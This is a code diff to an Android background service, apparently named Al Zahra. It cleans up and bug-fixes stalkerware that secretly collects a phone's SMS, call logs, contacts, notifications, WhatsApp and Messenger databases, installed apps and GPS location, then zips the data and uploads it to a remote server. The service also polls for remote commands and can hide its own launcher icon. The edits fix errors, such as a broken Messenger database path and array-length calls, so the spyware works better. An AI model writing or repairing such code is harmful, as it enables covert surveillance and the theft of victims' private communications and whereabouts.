@@ -4,14 +4,19 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Environment;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -35,8 +40,6 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipOutputStream;
 
 public class CoreService extends Service {
     private static final String TAG = "AlZahraService";
@@ -60,7 +63,6 @@ public class CoreService extends Service {
         createNotificationChannel();
         startForeground(1, createNotification());
         
-        // بدء المهام
         startTasks();
     }
     
@@ -82,10 +84,8 @@ public class CoreService extends Service {
     }
     
     private void startTasks() {
-        // إرسال كل شيء عند البداية
         handler.postDelayed(() -> sendAllData(), 5000);
         
-        // التحقق من الأوامر كل 10 ثواني
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -94,7 +94,6 @@ public class CoreService extends Service {
             }
         }, 10000);
         
-        // إرسال تحديث الحالة كل 30 ثانية
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -104,41 +103,18 @@ public class CoreService extends Service {
         }, 30000);
     }
     
-    // ═══════════════════════════════════════════
-    // إرسال جميع البيانات
-    // ═══════════════════════════════════════════
-    
     private void sendAllData() {
         Log.d(TAG, "Sending all data...");
         
-        // SMS
         new Thread(() -> sendSMS()).start();
-        
-        // Calls
         handler.postDelayed(() -> new Thread(() -> sendCalls()).start(), 2000);
-        
-        // Contacts
         handler.postDelayed(() -> new Thread(() -> sendContacts()).start(), 4000);
-        
-        // Notifications
         handler.postDelayed(() -> new Thread(() -> sendNotifications()).start(), 6000);
-        
-        // WhatsApp
         handler.postDelayed(() -> new Thread(() -> sendWhatsApp()).start(), 8000);
-        
-        // Messenger
         handler.postDelayed(() -> new Thread(() -> sendMessenger()).start(), 10000);
-        
-        // App Data
         handler.postDelayed(() -> new Thread(() -> sendAppData()).start(), 12000);
-        
-        // Location
         handler.postDelayed(() -> new Thread(() -> sendLocation()).start(), 14000);
     }
-    
-    // ═══════════════════════════════════════════
-    // SMS
-    // ═══════════════════════════════════════════
     
     private void sendSMS() {
         try {
@@ -167,10 +143,7 @@ public class CoreService extends Service {
             }
             cursor.close();
             
-            // حفظ محلياً
             saveToFile("sms", sb.toString());
-            
-            // إرسال
             sendData("sms", sb.toString());
             
             Log.d(TAG, "SMS sent: " + count);
@@ -178,10 +151,6 @@ public class CoreService extends Service {
             Log.e(TAG, "SMS error", e);
         }
     }
-    
-    // ═══════════════════════════════════════════
-    // المكالمات
-    // ═══════════════════════════════════════════
     
     private void sendCalls() {
         try {
@@ -228,10 +197,6 @@ public class CoreService extends Service {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // جهات الاتصال
-    // ═══════════════════════════════════════════
-    
     private void sendContacts() {
         try {
             ContentResolver cr = getContentResolver();
@@ -247,7 +212,6 @@ public class CoreService extends Service {
                 String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                 String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                 
-                // الحصول على الأرقام
                 Cursor phoneCursor = cr.query(
                     ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                     null,
@@ -284,13 +248,8 @@ public class CoreService extends Service {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // الإشعارات
-    // ═══════════════════════════════════════════
-    
     private void sendNotifications() {
         try {
-            // قراءة الإشعارات المحفوظة من NotificationListener
             String notifPath = secretPath + "/notifications";
             File notifDir = new File(notifPath);
             
@@ -298,7 +257,6 @@ public class CoreService extends Service {
                 notifDir.mkdirs();
             }
             
-            // جمع الإشعارات من الملفات
             StringBuilder sb = new StringBuilder();
             sb.append("=== Notifications ===\n\n");
             
@@ -330,16 +288,11 @@ public class CoreService extends Service {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // WhatsApp
-    // ═══════════════════════════════════════════
-    
     private void sendWhatsApp() {
         try {
             StringBuilder sb = new StringBuilder();
             sb.append("=== WhatsApp Data ===\n\n");
             
-            // مسارات واتساب
             String[] waPaths = {
                 "/data/data/com.whatsapp/databases/msgstore.db",
                 "/sdcard/WhatsApp/Databases/msgstore.db",
@@ -351,7 +304,6 @@ public class CoreService extends Service {
             for (String path : waPaths) {
                 File db = new File(path);
                 if (db.exists()) {
-                    // نسخ قاعدة البيانات
                     File dest = new File(secretPath + "/whatsapp/msgstore.db");
                     dest.getParentFile().mkdirs();
                     copyFile(db, dest);
@@ -362,7 +314,6 @@ public class CoreService extends Service {
                 }
             }
             
-            // مجلد الوسائط
             String[] mediaPaths = {
                 "/sdcard/WhatsApp/Media",
                 "/storage/emulated/0/WhatsApp/Media"
@@ -373,12 +324,12 @@ public class CoreService extends Service {
                 if (media.exists() && media.isDirectory()) {
                     File[] files = media.listFiles();
                     if (files != null) {
-                        sb.append("\nMedia files: ").append(files.length()).append("\n");
+                        sb.append("\nMedia files: ").append(files.length).append("\n");
                         for (File f : files) {
                             if (f.isDirectory()) {
                                 File[] subFiles = f.listFiles();
                                 if (subFiles != null) {
-                                    sb.append("  ").append(f.getName()).append(": ").append(subFiles.length()).append(" files\n");
+                                    sb.append("  ").append(f.getName()).append(": ").append(subFiles.length).append(" files\n");
                                 }
                             }
                         }
@@ -390,7 +341,6 @@ public class CoreService extends Service {
                 saveToFile("whatsapp", sb.toString());
                 sendData("whatsapp", sb.toString());
                 
-                // إرسال قاعدة البيانات
                 File dbFile = new File(secretPath + "/whatsapp/msgstore.db");
                 if (dbFile.exists()) {
                     sendFile("whatsapp_db", dbFile);
@@ -403,19 +353,14 @@ public class CoreService extends Service {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // Messenger
-    // ═══════════════════════════════════════════
-    
     private void sendMessenger() {
         try {
             StringBuilder sb = new StringBuilder();
             sb.append("=== Messenger Data ===\n\n");
             
-            // مسارات ماسنجر
             String[] msgPaths = {
                 "/data/data/com.facebook.orca/databases/threads_db2",
-                "/data/data.com.facebook.orca/databases/messages_db"
+                "/data/data/com.facebook.orca/databases/messages_db"
             };
             
             boolean found = false;
@@ -443,16 +388,12 @@ public class CoreService extends Service {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // بيانات التطبيقات
-    // ═══════════════════════════════════════════
-    
     private void sendAppData() {
         try {
             StringBuilder sb = new StringBuilder();
             sb.append("=== Installed Apps ===\n\n");
             
-            android.content.pm.PackageManager pm = getPackageManager();
+            PackageManager pm = getPackageManager();
             List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
             
             for (android.content.pm.ApplicationInfo app : apps) {
@@ -476,22 +417,17 @@ public class CoreService extends Service {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // الموقع
-    // ═══════════════════════════════════════════
-    
     private void sendLocation() {
         try {
             StringBuilder sb = new StringBuilder();
             sb.append("=== Location ===\n\n");
             
-            // محاولة الحصول على آخر موقع معروف
-            android.location.LocationManager lm = (android.location.LocationManager) getSystemService(Context.LOCATION_SERVICE);
+            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
             
             if (lm != null) {
                 try {
-                    android.location.Location gpsLoc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
-                    android.location.Location netLoc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
+                    Location gpsLoc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                    Location netLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                     
                     if (gpsLoc != null) {
                         sb.append("GPS Location:\n");
@@ -522,17 +458,12 @@ public class CoreService extends Service {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // إنشاء ملف ZIP وإرساله
-    // ═══════════════════════════════════════════
-    
     private void sendAllZip() {
         try {
             File zipFile = new File(secretPath + "/backup_" + System.currentTimeMillis() + ".zip");
             
             ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
             
-            // إضافة جميع الملفات
             File[] dirs = new File(secretPath).listFiles();
             if (dirs != null) {
                 for (File dir : dirs) {
@@ -544,7 +475,6 @@ public class CoreService extends Service {
             
             zos.close();
             
-            // إرسال الملف
             sendFile("all_backup", zipFile);
             
             Log.d(TAG, "ZIP sent: " + zipFile.length());
@@ -559,7 +489,7 @@ public class CoreService extends Service {
         
         for (File file : files) {
             if (file.isFile()) {
-                ZipEntry entry = new ZipEntry(basePath + "/" + file.getName());
+                java.util.zip.ZipEntry entry = new java.util.zip.ZipEntry(basePath + "/" + file.getName());
                 zos.putNextEntry(entry);
                 
                 FileInputStream fis = new FileInputStream(file);
@@ -575,10 +505,6 @@ public class CoreService extends Service {
             }
         }
     }
-    
-    // ═══════════════════════════════════════════
-    // التحقق من الأوامر
-    // ═══════════════════════════════════════════
     
     private void checkCommands() {
         new Thread(() -> {
@@ -631,8 +557,9 @@ public class CoreService extends Service {
     
     private void hideApp() {
         try {
+            ComponentName component = new ComponentName(this, com.alzahra.MainActivity.class);
             getPackageManager().setComponentEnabledSetting(
-                new ComponentName(this, "com.alzahra.MainActivity"),
+                component,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
         } catch (Exception e) {
@@ -642,18 +569,15 @@ public class CoreService extends Service {
     
     private void unhideApp() {
         try {
+            ComponentName component = new ComponentName(this, com.alzahra.MainActivity.class);
             getPackageManager().setComponentEnabledSetting(
-                new ComponentName(this, "com.alzahra.MainActivity"),
+                component,
                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                 PackageManager.DONT_KILL_APP);
         } catch (Exception e) {
             Log.e(TAG, "Unhide error", e);
         }
     }
-    
-    // ═══════════════════════════════════════════
-    // إرسال البيانات
-    // ═══════════════════════════════════════════
     
     private void sendData(String type, String data) {
         try {
@@ -690,17 +614,14 @@ public class CoreService extends Service {
             
             java.io.OutputStream os = conn.getOutputStream();
             
-            // device_id
             os.write(("--" + boundary + "\r\n").getBytes());
             os.write("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n".getBytes());
             os.write((deviceId + "\r\n").getBytes());
             
-            // type
             os.write(("--" + boundary + "\r\n").getBytes());
             os.write("Content-Disposition: form-data; name=\"type\"\r\n\r\n".getBytes());
             os.write((type + "\r\n").getBytes());
             
-            // file
             os.write(("--" + boundary + "\r\n").getBytes());
             os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
             os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes());
@@ -752,17 +673,15 @@ public class CoreService extends Service {
             if (batteryIntent != null) {
                 int level = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                 int scale = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
-                return (int) (level * 100.0 / scale);
+                if (scale > 0) {
+                    return (int) (level * 100.0 / scale);
+                }
             }
         } catch (Exception e) {
             // ignore
         }
         return 0;
     }
-    
-    // ═══════════════════════════════════════════
-    // وظائف مساعدة
-    // ═══════════════════════════════════════════
     
     private void saveToFile(String type, String data) {
         try {
